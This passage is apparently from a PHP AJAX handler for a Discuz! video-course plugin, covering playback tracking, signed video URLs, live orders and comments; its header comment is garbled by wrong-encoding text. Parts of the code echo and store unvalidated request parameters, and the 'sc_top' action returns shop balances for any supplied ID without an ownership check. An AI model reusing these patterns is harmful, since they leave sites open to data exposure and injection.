<?php
/**
 *	�����Ŷӣ�IT618
 *	it618_copyright �����ƣ�<a href="http://t.cn/Aiux1Qh0" target="_blank" title="רҵDiscuz!Ӧ�ü��ܱ��ṩ��">DisM.Taobao.Com</a>
 */

if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

require_once DISCUZ_ROOT.'./source/plugin/it618_video/video_function.func.php';

$uid = $_G['uid'];
$it618_pid=intval($_GET['it618_pid']);

$pagetype=$_GET['pagetype'];


if($_GET['ac']=="getmode"){
	$modeid=intval($_GET['modeid']);
	require_once DISCUZ_ROOT.'./source/plugin/it618_video/getmode.func.php';
	
	if($it618_video_diy=C::t('#it618_video#it618_video_diy')->fetch_by_id($modeid)){
		if($it618_video_diy['it618_isjs']==1){
			$tmpstr = it618_video_getmodecontent($it618_video_diy['it618_type'],$it618_video_diy['it618_sql'],$it618_video_diy['it618_modecode'],$it618_video_diy['it618_count']);
			$tmpstr=str_replace(array("\r\n", "\r", "\n"),"",$tmpstr);
			$tmpstr=str_replace("'",'"',$tmpstr);
			
			echo "document.write('".$tmpstr."')";
		}
	}

	exit;
}


if($_GET['ac']=="pcstyle"){
	dsetcookie('it618_video_pcstylename',$_GET['stylename'],31536000);
	echo 'ok';exit;
}


if($_GET['ac']=="appad"){
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_video/config/appad.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_video/config/appad.php';
	}
	dsetcookie('it618_video_appad',$_G['timestamp'],$appad_cookiestime*60);
	echo 'ok';exit;
}


if($_GET['ac']=="getliveonline"){
	if($it618_video_live=C::t('#it618_video#it618_video_live')->fetch_by_id($_GET['liveid'])){
		if($it618_video_live['it618_isonline']==1)echo 'it618_splitok';exit;
	}
}


if($_GET['ac']=="playajax"){
	if($it618_video_play=C::t('#it618_video#it618_video_play')->fetch_by_it618_playcode($_GET['playcode'])){
		dsetcookie('it618vide_ucode',$it618_video_play['it618_ucode'],10);
		
		$it618_video_goods_video=C::t('#it618_video#it618_video_goods_video')->fetch_by_id($it618_video_play['it618_vid']);
		
		if($it618_video_goods_video['it618_liveid']>0){
			$it618_video_live = C::t('#it618_video#it618_video_live')->fetch_by_id($it618_video_goods_video['it618_liveid']);
			if($it618_video_live['it618_forbid']==1){
				echo 'it618_splitliveok';exit;
			}
			if($it618_video_live['it618_isonline']==0){
				echo 'it618_splitlivenoton';exit;
			}
		}
		
		if($it618_video_play['it618_gtype']==1){
			if($_GET['alltime']>0){

				if($it618_video_goods_video['it618_islive']==0){
					if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_video/config/player.php')){
						require DISCUZ_ROOT.'./source/plugin/it618_video/config/player.php';
					}
					if($player_httptime=='')$player_httptime=1.5;
		
					C::t('#it618_video#it618_video_play')->update($it618_video_play['id'],array(
						'it618_curtime' => $_GET['curtime'],
						'it618_alltime' => $_GET['alltime'],
						'it618_playtime' => $it618_video_play['it618_playtime']+$player_httptime,
						'it618_etime' => $_G['timestamp']
					));
					
					if($it618_video_goods_video['it618_videotime']==0){
						$tmparr=it618_video_getvideotimearr($_GET['alltime']);
						
						C::t('#it618_video#it618_video_goods_video')->update($it618_video_goods_video['id'],array(
							'it618_videotime' => $_GET['alltime'],
							'it618_videotime1' => $tmparr[0],
							'it618_videotime2' => $tmparr[1],
							'it618_videotime3' => $tmparr[2]
						));
						
						if($it618_video_media_live=C::t('#it618_video#it618_video_media_live')->fetch_by_url($it618_video_goods_video['it618_videourl'])){
							C::t('#it618_video#it618_video_media_live')->update($it618_video_media_live['id'],array(
								'it618_time1' => $tmparr[0],
								'it618_time2' => $tmparr[1],
								'it618_time3' => $tmparr[2]
							));
						}
	
						if($it618_video_media_audio=C::t('#it618_video#it618_video_media_audio')->fetch_by_url($it618_video_goods_video['it618_videourl'])){
							C::t('#it618_video#it618_video_media_audio')->update($it618_video_media_audio['id'],array(
								'it618_time1' => $tmparr[0],
								'it618_time2' => $tmparr[1],
								'it618_time3' => $tmparr[2]
							));
						}
						
						$it618_video_goods_videotmp=C::t('#it618_video#it618_video_goods_video')->fetch_count_time_by_pid($it618_video_goods_video['it618_pid']);
						C::t('#it618_video#it618_video_goods')->update($it618_video_goods_video['it618_pid'],array(
							'it618_videocount' => $it618_video_goods_videotmp['videocount'],
							'it618_videotime' => $it618_video_goods_videotmp['videotime']
						));
						
						$it618_video_goods_videotmp=C::t('#it618_video#it618_video_goods_video')->fetch_count_time_by_lid($it618_video_goods_video['it618_lid']);
						C::t('#it618_video#it618_video_goods_lesson')->update($it618_video_goods_video['it618_lid'],array(
							'it618_videocount' => $it618_video_goods_videotmp['videocount'],
							'it618_videotime' => $it618_video_goods_videotmp['videotime']
						));
					}
				}
				
			}
			
			C::t('#it618_video#it618_video_play')->update($it618_video_play['id'],array(
				'it618_etime' => $_G['timestamp']
			));
		}else{
			C::t('#it618_video#it618_video_play')->update($it618_video_play['id'],array(
				'it618_etime' => $_G['timestamp']
			));
		}
		
		if($_GET['isajaxpower']=="1"){
			$videopower=it618_video_getpower($_G['uid'],$it618_video_goods_video['it618_pid'],$it618_video_goods_video['it618_lid'],$it618_video_goods_video['id']);
			if($videopower['state']==0){
				echo 'it618_splittime';exit;
			}
		}
		
	}else{
		echo 'it618_splitone';exit;
	}
}


if($_GET['ac']=="getvideocode"){
	if($it618_video_videowork=C::t('#it618_video#it618_video_videowork')->fetch_by_it618_code($_GET['code'])){
		
		C::t('#it618_video#it618_video_videowork')->delete_by_id($it618_video_videowork['id']);
		
		$tmparr=explode("it618_split",$it618_video_videowork['it618_video']);
		$it618_gtype=$tmparr[0];
		$vid=$tmparr[1];

		if($it618_video_goods_video=C::t('#it618_video#it618_video_goods_video')->fetch_by_id($vid)){
			$it618_video_goods=C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_goods_video['it618_pid']);
			
			$video_shopadmin=explode(",",$it618_video['video_shopadmin']);
			
			if($it618_gtype==1&&!in_array($_G['uid'], $video_shopadmin)){
				
				if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_video/config/player.php')){
					require DISCUZ_ROOT.'./source/plugin/it618_video/config/player.php';
				}
				
				if($IsMembers==1&&$it618_video_goods_video['it618_liveid']==0&&($player_wxgoodsids!=''||$player_wxvideoids!='')){
					if(strpos($_SERVER['HTTP_USER_AGENT'],'MicroMessenger')!==false){
						if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/config/wxjk.php')){
							require DISCUZ_ROOT.'./source/plugin/it618_members/config/wxjk.php';
						}
						$it618_openid=getcookie('it618_openid');
						$it618_openidmd5=getcookie(md5('it618_openid'.$wxjk_appsecret.$it618_openid));
					}
					
					if($it618_openidmd5==''){
						$isok=1;
						if($it618_video_goods['it618_saleprice']>0||$it618_video_goods['it618_score']>0){
							if($it618_video_goods_video['it618_isuser']==1){
								if($player_wxgoodsids=='@'){
									$isok=0;
								}else{
									$goodsidsarr=explode(",",$player_wxgoodsids);
									if(in_array($it618_video_goods_video['it618_pid'],$goodsidsarr)){
										$isok=0;
									}
								}
								
								$videoidsarr=explode(",",$player_wxvideoids);
								if(in_array($it618_video_goods_video['id'],$videoidsarr)){
									$isok=0;
								}
							}
						}

						if($isok==0){
							$tmpurl=it618_video_getrewrite('video_wap','lesson@'.$vid,'plugin.php?id=it618_video:wap&pagetype=lesson&cid='.$vid);
							$qrcodesrc='plugin.php?id=it618_video:urlcode&url='.urlencode($_G['siteurl'].$tmpurl);
							if($_GET['wap']==0){
								echo 'it618_splitWXOPENIDit618_split<img src="'.$qrcodesrc.'" style="margin-bottom:15px"><br>'.$player_wxabout;
							}else{
								echo 'it618_splitWXOPENIDit618_split<img src="'.$qrcodesrc.'" style="margin-bottom:6px;width:115px"><br>'.$player_wxabout;
							}
							exit;
						}
					}
				}
				
				$isok=0;
				if($player_browsermode==1||$player_browsermode=='')$isok=1;
				if($player_browsermode==2){
					if($player_browseragent2!=''){
						$agentarr=explode(",",$player_browseragent2);
						for($i=0;$i<count($agentarr);$i++){
							$tmparrtmp=explode($agentarr[$i],$_SERVER['HTTP_USER_AGENT']);
							if(count($tmparrtmp)>1){
								$isok=1;
								break;
							}
						}
					}else{
						$isok=1;
					}
				}
				if($player_browsermode==3){
					if($player_browseragent3!=''){
						$isok=1;
						$agentarr=explode(",",$player_browseragent3);
						for($i=0;$i<count($agentarr);$i++){
							$tmparrtmp=explode($agentarr[$i],$_SERVER['HTTP_USER_AGENT']);
							if(count($tmparrtmp)>1){
								$isok=0;
								break;
							}
						}
					}else{
						$isok=1;
					}
				}
				
				if(strpos($_SERVER['HTTP_USER_AGENT'],'MicroMessenger')!==false)$isok=1;
				if(strpos($_SERVER['HTTP_USER_AGENT'],'MAGAPPX')!==false)$isok=1;
				if(strpos($_SERVER['HTTP_USER_AGENT'],'Appbyme')!==false)$isok=1;
				
				if($isok==0){
					echo 'it618_splitAGENTit618_split'.$player_browserabout;
					exit;
				}
			}
			
			if($uid>0){
				$it618vide_ucode=getcookie('it618vide_ucode');
				if($it618vide_ucode==''){
					$it618vide_ucode=md5($uid.$_G['clientip'].$_G['timestamp'].$_GET['code']);
					dsetcookie('it618vide_ucode',$it618vide_ucode,10);
				}
				
				if($it618_video_play=C::t('#it618_video#it618_video_play')->fetch_by_uid_etime($uid)){
					if($_G['timestamp']-$it618_video_play['it618_etime']<6){
						if($it618_video_play['it618_ucode']!=$it618vide_ucode){
							echo 'it618_splitoneit618_split'.$it618_video_lang['s929'].' '.$_G['username'].' '.$it618_video_lang['s930'];
							exit;
						}
					}
				}
				
				$isblock=0;
				$query = DB::query("SELECT * FROM ".DB::table('it618_video_goods_block')." where it618_uid=$uid and it618_isok=1 and (it618_etime='' or (it618_etime!='' and UNIX_TIMESTAMP(it618_etime)>".$_G['timestamp'].")) order by it618_etime");
				while($it618_video_goods_block = DB::fetch($query)) {
					
					if($it618_video_goods_block['it618_pids']=='all'){
						$isblock=1;$blocketime=$it618_video_goods_block['it618_etime'];break;
					}else if($it618_video_goods_block['it618_pids']!=''){
						$tmppidarr=explode(",",$it618_video_goods_block['it618_pids']);
						if(in_array($it618_video_goods_video['it618_pid'],$tmppidarr)){
							$isblock=1;$blocketime=$it618_video_goods_block['it618_etime'];break;
						}
					}
					
					if($it618_video_goods_block['it618_shopids']=='all'){
						$isblock=1;$blocketime=$it618_video_goods_block['it618_etime'];break;
					}else if($it618_video_goods_block['it618_shopids']!=''){
						$tmppidarr=explode(",",$it618_video_goods_block['it618_shopids']);
						if(in_array($it618_video_goods['it618_shopid'],$tmppidarr)){
							$isblock=1;$blocketime=$it618_video_goods_block['it618_etime'];break;
						}
					}
				}
				
				if($isblock==1){
					if($blocketime!='')$blocketime='<br>'.$blocketime.$it618_video_lang['s1526'];
					echo 'it618_splitBLOCKit618_split'.$it618_video_goods_block['it618_about'].$blocketime;
					exit;	
				}
			}
			
			if($it618_video_goods_video['it618_liveid']>0){
				$it618_video_live=C::t('#it618_video#it618_video_live')->fetch_by_id($it618_video_goods_video['it618_liveid']);
				$it618_url=$it618_video_live['it618_m3u8url'];
				$it618_islive=1;
				$tmparr=explode("@",$it618_url);
				if(count($tmparr)>1){
					$it618_url=$tmparr[1];
					if($_GET['wap']==0)$it618_url=$tmparr[0];
				}else{
					if($_GET['wap']==0){
						if($it618_video_live['it618_liveset_id']>0){
							$it618_url=$it618_video_live['it618_flvurl'];
							if($it618_url=='')$it618_url=$it618_video_live['it618_m3u8url'];
							$it618_video_liveset=C::t('#it618_video#it618_video_liveset')->fetch_by_id($it618_video_live['it618_liveset_id']);
							
							if($it618_video_liveset['it618_pcflash']==0){
								$urlarr=explode("https://",$_G['siteurl']);
								if(count($urlarr)>1){
									$it618_url=str_replace("http://","https://",$it618_url);
								}
							}else{
								$isflash=1;
							}
						}
					}
				}
			}else{
				$it618_url=$it618_video_goods_video['it618_videourl'];
				$it618_islive=$it618_video_goods_video['it618_islive'];
				
				$tmparr=explode("<iframe",$it618_url);
				if(count($tmparr)>1){
					$urlarr=explode("https://",$_G['siteurl']);
					if(count($urlarr)>1){
						$it618_url=str_replace("http://","https://",$it618_url);
					}
				}
			}
			
			if($uid>0){
				$playcode=md5($uid.$_G['clientip'].$_G['timestamp']);
				
				if($it618_video_play=C::t('#it618_video#it618_video_play')->fetch_by_vid_uid($vid,$uid)){
					$it618_ips=$it618_video_play['it618_ips'];
					$tmparr=explode($_G['clientip'],$it618_video_play['it618_ips']);
					if(count($tmparr)==1){
						if($it618_video_play['it618_ips']==''){
							$it618_ips=$_G['clientip'];
						}else{
							$it618_ips=$it618_video_play['it618_ips'].','.$_G['clientip'];
						}
					}
					
					C::t('#it618_video#it618_video_play')->update($it618_video_play['id'],array(
						'it618_btime' => $_G['timestamp'],
						'it618_etime' => $_G['timestamp'],
						'it618_ip' => $_G['clientip'],
						'it618_ips' => $it618_ips,
						'it618_playcode' => $playcode,
						'it618_ucode' => $it618vide_ucode
					));
				}else{
					C::t('#it618_video#it618_video_play')->insert(array(
						'it618_uid' => $uid,
						'it618_shopid' => $it618_video_goods['it618_shopid'],
						'it618_pid' => $it618_video_goods['id'],
						'it618_gtype' => $it618_video_goods['it618_gtype'],
						'it618_vid' => $vid,
						'it618_btime' => $_G['timestamp'],
						'it618_etime' => $_G['timestamp'],
						'it618_ip' => $_G['clientip'],
						'it618_ips' => $_G['clientip'],
						'it618_playcode' => $playcode,
						'it618_ucode' => $it618vide_ucode
					), true);
					
					if(C::t('#it618_video#it618_video_play_pj')->count_by_pid_uid($it618_video_goods['id'],$uid)==0){
						C::t('#it618_video#it618_video_play_pj')->insert(array(
							'it618_uid' => $uid,
							'it618_shopid' => $it618_video_goods['it618_shopid'],
							'it618_pid' => $it618_video_goods['id'],
							'it618_time' => $_G['timestamp']
						), true);
						
						C::t('#it618_video#it618_video_goods')->update_it618_plays_by_id($it618_video_goods['id']);
					}
					
					C::t('#it618_video#it618_video_goods_video')->update_it618_plays_by_id($vid);
				}
			}
			
			if($it618_gtype==1){
				$tmparr=explode("<iframe",$it618_url);
				if(count($tmparr)>1){
					$tmpstr='iframe';
					$it618_url=str_replace("'",'"',$it618_url);
					$it618_url=preg_replace('/<iframe.+?src=\"(.+?)\".+?>/','<iframe src="\1" frameborder=0 allowfullscreen=1>',$it618_url);
				}else{
					$tmpstr='video';
					$tmparr1=explode(".m3u8",$it618_url);
					if(count($tmparr1)>1){
						$tmpstr1='m3u8';
						if($it618_video_media_mts=C::t('#it618_video#it618_video_media_mts')->fetch_by_url($it618_video_goods_video['it618_videourl'])){
							$it618_video_media=C::t('#it618_video#it618_video_media')->fetch_by_id($it618_video_media_mts['it618_media_id']);
							$it618_video_media_wmf=C::t('#it618_video#it618_video_media_wmf')->fetch_by_id($it618_video_media['it618_wmf_id']);
							$mediaimg=it618_video_cdnkeyurl($it618_video_media['it618_coverurl']);
							dsetcookie('it618_hlskms'.md5($it618_video_media['it618_mediaid'].$it618_video_media_wmf['it618_accesskey']),1,31536000);
						}
						$it618_url=it618_video_cdnkeyurl($it618_url);
					}else{
						$it618_url=it618_video_getsignedurl($it618_url);
					}
					
					if($it618_video_goods_video['it618_videoimg']!=''){
						$it618_videoimg=$it618_video_goods_video['it618_videoimg'];
					}else{
						$it618_videoimg=$it618_video_goods['it618_picbig'];
						if($mediaimg!='')$it618_videoimg=$mediaimg;
					}
					$tmparr=explode("://",$it618_videoimg);
					if(count($tmparr)==1){
						$it618_videoimg=$_G['siteurl'].$it618_videoimg;
					}
				}
				
				if($it618_video_play['it618_curtime']==0||$it618_video_play['it618_curtime']+6>$it618_video_play['it618_alltime']){
					$it618_curtime='0';
				}else{
					$it618_curtime=$it618_video_play['it618_curtime'];
				}
				
				if($tmpstr=='video'&&$isflash==0){
					if($_GET['wap']==0){
						if(!strpos($_SERVER['HTTP_USER_AGENT'],'WindowsWechat')!==false){
							$agentarr=explode(",",$player_typeagent);
							for($i=0;$i<count($agentarr);$i++){
								$tmparrtmp=explode($agentarr[$i],$it618_url);
								if(count($tmparrtmp)>1){
									$isflash=1;
									break;
								}
							}
						}else{
							$urlarr=explode("https://",$_G['siteurl']);
							if(count($urlarr)>1){
								$it618_url=str_replace("http://","https://",$it618_url);
							}
						}
					}
				}
				
				$it618_message=$it618_video_goods_video['it618_message'];
				if($it618_message!=''){
					$it618_message=str_replace('type="application/x-shockwave-flash"','type="application/x-shockwave-flash" wmode="opaque"',$it618_message);
					$it618_message=preg_replace('/<table.+?>/','<table cellspacing="0" cellpadding="0" width="100%">',$it618_message);
					$it618_message=preg_replace('/<iframe.+?src=\"(.+?)\".+?>/','<iframe src="\1" width="640" height="220" frameborder="0" allowfullscreen="1">',$it618_message);
					$it618_message=str_replace('&it618mediatype=audio"','&wap=1" style="border:0;width:100%;height:53px" scrolling="no" frameborder=0',$it618_message);
				}
				
				if($it618_video_goods_video['it618_isuser']!=1&&$it618_video_goods_video['it618_usercode']!=''){
					$usercode=$it618_video_goods_video['it618_usercode'];
					
					$it618_video_shop = C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_goods['it618_shopid']);
					$vipgroupids=it618_video_getgoodsvipgroupids($it618_video_goods);
					if($_G['uid']>0){
						$videopower=it618_video_getpower($_G['uid'],$it618_video_goods_video['it618_pid'],$it618_video_goods_video['it618_lid'],$it618_video_goods_video['id']);
						if(count($vipgroupids)>0){
							$tmpgrouparr=it618_video_getisvipuser($vipgroupids);
							$isvipuser=count($tmpgrouparr[0]);
						}
					}
					if($videopower['state']>0){
						$usercode='';
					}else{
						if(count($vipgroupids)>0){
							if($isvipuser>0){
								$usercode='';
							}
						}
					}
					
					if($_G['uid']==$it618_video_shop['it618_uid']){
						$usercode='';
					}
				}
				
				if($usercode!=''){
					$it618_usercodeabout=$it618_video_lang['s1979'];
					if($it618_video_goods_video['it618_usercodeabout']!='')$it618_usercodeabout=$it618_video_goods_video['it618_usercodeabout'];
					$usercode=$usercode.'it618split'.$it618_usercodeabout;
				}
				
				echo 'it618_split'.$tmpstr.'it618_split'.$tmpstr1.'it618_split'.$it618_url.'it618_split'.$usercode.'it618_split'.$it618_videoimg.'it618_split'.$playcode.'it618_split'.$it618_curtime.'it618_split'.$it618_islive.'it618_split'.$isflash.'it618_split'.$it618_message;
			}else{
				$tmpstr='audio';
				
				$n=0;
				$query = DB::query("SELECT * FROM ".DB::table('it618_video_goods_video_audio')." WHERE it618_vid=".$vid." ORDER BY it618_order");
				while($it618_video_goods_video_audio = DB::fetch($query)) {
					$videotimestr='';
	
					$it618_videotime=$it618_video_goods_video_audio['it618_videotime1'];
					if($it618_videotime>0){
						if($it618_videotime<10)$it618_videotime='0'.$it618_videotime;
						$videotimestr.=$it618_videotime.':';
					}
					
					$it618_videotime=$it618_video_goods_video_audio['it618_videotime2'];
					if($it618_videotime<10)$it618_videotime='0'.$it618_videotime;
					$videotimestr.=$it618_videotime.':';
						
					$it618_videotime=$it618_video_goods_video_audio['it618_videotime3'];
					if($it618_videotime>0){
						if($it618_videotime<10)$it618_videotime='0'.$it618_videotime;
						$videotimestr.=$it618_videotime;
					}
					
					if($videotimestr=='00:')$videotimestr='00:00';
					
					if($n==0){
						$it618_url='<iframe id="it618iframeaudio" src="plugin.php?id=it618_video:audio&aid='.$it618_video_goods_video_audio['id'].'&wap='.$_GET['wap'].'" style="border:0;width:100%" scrolling="no" frameborder=0>';
						$it618_name='<font color=#f60>'.$it618_video_goods_video_audio['it618_name'].'</font>';
					}else{
						$it618_name=$it618_video_goods_video_audio['it618_name'];
					}
					
					//$url=it618_video_getsignedurl($it618_video_goods_video_audio['it618_videourl']);<a href="'.$url.'" target="_blank" >down</a> 
					
					$n=$n+1;
					$audios.='<tr '.$tmpcss.'><td>'.$n.$it618_video_lang['s1103'].'<a href="javascript:" onclick="audioplay('.$n.')" id="name'.$n.'">'.$it618_name.'</a><span>'.$videotimestr.'</span><span id="tmpname'.$n.'" style="display:none">'.$it618_video_goods_video_audio['it618_name'].'</span><input type="hidden" id="aid'.$n.'" value="'.$it618_video_goods_video_audio['id'].'"></td></tr>';
					
				}
				
				$audios='<table>'.$audios.'</table><input type="hidden" id="audion" value="'.$n.'">';
				
				$it618_message=$it618_video_goods_video['it618_message'];
				if($_GET['wap']==1){
					$it618_message=str_replace('type="application/x-shockwave-flash"','type="application/x-shockwave-flash" wmode="opaque"',$it618_message);
					$it618_message=preg_replace('/<table.+?>/','<table cellspacing="0" cellpadding="0" width="100%">',$it618_message);
					$it618_message=preg_replace('/<iframe.+?src=\"(.+?)\".+?>/','<iframe src="\1" width="640" height="220" frameborder="0" allowfullscreen="1">',$it618_message);
				}else{
					$it618_message=preg_replace('/<iframe.+?src=\"(.+?)\".+?>/','<iframe width="910" height="510" src="\1" frameborder="0" allowfullscreen="1"/>',$it618_message);	
				}
				
				echo 'it618_split'.$tmpstr.'it618_split'.$tmpstr1.'it618_split'.$it618_message.'it618_split'.$audios.'it618_split'.$it618_url.'it618_split'.$playcode;
			}
		}
	}

	exit;
}


if($_GET['ac']=="hlskms"){
	echo it618_video_getkmsdecrypt($_GET['MediaId'],$_GET['Ciphertext']);exit;
}


if($_GET['ac']=="getformhash"){
	echo 'it618_split'.FORMHASH.'it618_split';exit;
}


if($_GET['ac']=="getlivecontent"){	
	echo it618_video_getlivecontent($_GET['liveid'],$_GET['wap']);
	exit;
}


if($_GET['ac']=="sc_top"){	
	$ktxmoney = C::t('#it618_video#it618_video_shop')->fetch_money_by_id($_GET['sid']);
	$sqmoney=C::t('#it618_video#it618_video_tx')->sumtxmoney_by_shopid_state($_GET['sid'],1);
	$txmoney=C::t('#it618_video#it618_video_tx')->sumtxmoney_by_shopid_state($_GET['sid'],2);
	
	if($sqmoney=='')$sqmoney='0.00';
	if($txmoney=='')$txmoney='0.00';else $txmoney=round($txmoney,2);
	
	echo '<font color=#fff><strong>'.$_G['username'].'</strong></font> '.it618_video_getlang('s420').'<font color=#6F0>'.$ktxmoney.'</font> '.it618_video_getlang('s421').'<font color=#FF6>'.$sqmoney.'</font> '.it618_video_getlang('s422').'<font color=#FF6>'.$txmoney.'</font> '.it618_video_getlang('s125').'it618_split'.FORMHASH;
}


if($_GET['ac']=="shopsubscribe"){	
	if($uid<=0){
		echo it618_video_getlang('s485');
	}else{
		if($it618_video_shop_subscribe=C::t('#it618_video#it618_video_shop_subscribe')->fetch_by_shopid_uid($_GET['shopid'],$uid)){
			C::t('#it618_video#it618_video_shop_subscribe')->delete_by_id($it618_video_shop_subscribe['id']);

			echo 'it618_splitdelit618_split';
		}else{
			
			$id = C::t('#it618_video#it618_video_shop_subscribe')->insert(array(
				'it618_shopid' => $_GET['shopid'],
				'it618_uid' => $uid,
				'it618_tel' => $_GET['it618_tel'],
				'it618_time' => $_G['timestamp']
			), true);
			
			echo 'it618_splitokit618_split';
		}
	}
	exit;
}


if($_GET['ac']=="liveorder"){	
	if($uid<=0){
		echo it618_video_getlang('s485');
	}else{
		if($it618_video_live_order=C::t('#it618_video#it618_video_live_order')->fetch_by_liveid_uid($_GET['liveid'],$uid)){
			C::t('#it618_video#it618_video_live_order')->delete_by_id($it618_video_live_order['id']);

			echo 'it618_splitokit618_split';
		}else{
			if($_GET['istel']!=1){
				
				if($it618_members_wxuser=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_wxuser')." WHERE it618_uid=".$uid)){
					
					if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/config/wxjk.php')){
						require DISCUZ_ROOT.'./source/plugin/it618_members/config/wxjk.php';
					}
					
					require_once DISCUZ_ROOT.'./source/plugin/it618_members/sms/sms_wx/WxSms.php';
					
					$openid=$it618_members_wxuser['it618_wxopenid'];
					$appid=trim($wxjk_appid);
					$appsecret=trim($wxjk_appsecret);
					
					$data=get_wxsubscribe($appid,$appsecret,$openid,DISCUZ_ROOT);
					$subscribe=$data['subscribe'];
					
					if($subscribe==0){
						echo $it618_video_lang['s1392'];exit;
					}
				}else{
					echo $it618_video_lang['s1391'];exit;
				}
			}
			
			$id = C::t('#it618_video#it618_video_live_order')->insert(array(
				'it618_liveid' => $_GET['liveid'],
				'it618_uid' => $uid,
				'it618_tel' => it618_video_utftogbk($_GET['it618_tel']),
				'it618_time' => $_G['timestamp']
			), true);
			
			echo 'it618_splitokit618_split';
		}
	}
	exit;
}


if($_GET['ac']=="pl_add"){
	if($uid<=0){
		echo it618_video_getlang('s485');
	}else{
		$it618_video_goods_video=C::t('#it618_video#it618_video_goods_video')->fetch_by_id($_GET['vid']);
		$it618_video_goods=C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_goods_video['it618_pid']);
		
		if(it618_video_getvideopower($it618_video_goods_video,$it618_video_goods)==1){
			$id = C::t('#it618_video#it618_video_goods_video_pl')->insert(array(
				'it618_shopid' => $it618_video_goods['it618_shopid'],
				'it618_pid' => $it618_video_goods['id'],
				'it618_vid' => $it618_video_goods_video['id'],
				'it618_uid' => $uid,
				'it618_content' => it618_video_utftogbk($_GET['it618_content']),
				'it618_time' => $_G['timestamp']
			), true);

			echo it618_video_getlang('t748');
		}else{
			echo it618_video_getlang('s121');
		}
	}
	exit;
}


if($_GET['ac']=="hfpl"){
	$it618_video_goods_video_pl=C::t('#it618_video#it618_video_goods_video_pl')->fetch_by_id($_GET['plid']);
	$video_shopadmin=explode(",",$it618_video['video_shopadmin']);
	
	if(!in_array($_G['uid'], $video_shopadmin)){
		if($_G['uid']>0){
			if($it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_uid($_G['uid'])){
				if($it618_video_shop['id']==$it618_video_goods_video_pl['it618_shopid']){
					$shopflag=1;
				}
			}
		}
	}else{
		$shopflag=1;
	}
	
	if($shopflag==1){
		C::t('#it618_video#it618_video_goods_video_pl')->update($it618_video_goods_video_pl['id'],array(
			'it618_hfcontent' => it618_video_utftogbk($_GET["hfvalue"]),
			'it618_hftime' => $_G['timestamp']
		));
		
		echo 'okit618_split'.it618_video_getlang('t344');
	}else{
		echo it618_video_getlang('s513');exit;
	}
	exit;
}


if($_GET['ac']=="pl_del"){
	if($uid<=0){
		echo it618_video_getlang('s485');
	}else{
		$video_shopadmin=explode(",",$it618_video['video_shopadmin']);
		
		if(in_array($uid, $video_shopadmin)){
			C::t('#it618_video#it618_video_goods_video_pl')->delete_by_id($_GET['plid']);
			echo it618_video_getlang('t383');exit;
		}else{
			if($it618_video_goods_video_pl=C::t('#it618_video#it618_video_goods_video_pl')->fetch_by_id($_GET['plid'])){
				if($it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_goods_video_pl['it618_shopid'])){
					if($it618_video_shop['it618_uid']==$uid){
						C::t('#it618_video#it618_video_goods_video_pl')->delete_by_id($_GET['plid']);
						echo it618_video_getlang('t383');exit;
					}
				}
			}
			
			echo it618_video_getlang('t385');
		}
	}
	exit;
}


if($_GET['ac']=="pl_get"){
	$vid=intval($_GET['vid']);
	$it618_video_goods_video=C::t('#it618_video#it618_video_goods_video')->fetch_by_id($vid);
	$it618_video_goods=C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_goods_video['it618_pid']);
	
	if(it618_video_getvideopower($it618_video_goods_video,$it618_video_goods)!=1){
		echo it618_video_getlang('s121');exit;
	}
	
	$page = max(1, intval($_GET['page']));
	$ppp = 30;$strtmply=it618_video_getlang('s454');
	$startlimit = ($page - 1) * $ppp;
	$count = C::t('#it618_video#it618_video_goods_video_pl')->count_by_it618_vid($vid);
	$it618_video_goods_video_pls=C::t('#it618_video#it618_video_goods_video_pl')->fetch_all_by_it618_vid($vid,$startlimit,$ppp);

	if($count<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($count/$ppp);
	}
	
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&vid=$vid&page=".$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getpllist(this.value)">'.$curpage.'</select>';
		
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&vid=$vid&page=2";
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getpllist(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&vid=$vid&page=".($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getpllist(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&vid=$vid&page=".($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getpllist(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&vid=$vid&page=".($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getpllist(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
		}
		$multipage=$pagepre.' '.$curpage.' '.$pagenext;
	}
	
	if($it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_goods['it618_shopid'])){
		if($it618_video_shop['it618_uid']==$uid){
			$isshop=1;
		}
	}
	
	$video_shopadmin=explode(",",$it618_video['video_shopadmin']);
	
